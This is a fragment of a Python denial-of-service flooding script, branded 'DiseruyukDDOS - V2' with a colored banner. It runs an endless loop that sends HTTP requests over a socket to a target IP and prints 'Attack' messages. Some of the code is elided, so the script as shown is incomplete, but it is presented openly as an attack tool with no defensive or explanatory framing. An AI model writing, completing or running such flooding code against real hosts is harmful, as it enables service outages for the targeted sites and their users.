...
\033[35m                ╔═══════════════════════════════════════════════╗
\033[35m                ║\033[32m- - - - - - DDoS  vF By \033[36m@DISERUYUK \033[35m - - - - - -║
...
os.system('color ' +random.choice(['a', 'b', 'c', 'd'])+ " & cls & title DiseruyukDDOS - V2")
def run():
    header = Headers("get")
    i = random.choice(("[*]","[!]","[#]"))
    ...
    while True:
        try:
            ...
            s.sendall(str.encode(request))
            s.sendall(str.encode(request))
            print(f"\033[0m @Diseruyuk Attack  ════>  to \033[1;35m{ip}\033[0m")
        except socket.error:
            s.close()
            print(f"\033[0m @Diseruyuk Attack  ════>  to \033[1;35m{ip}\033[0m")
            print(f"\033[0m @Diseruyuk Attack  ════>  to \033[1;35m{ip}\033[0m")
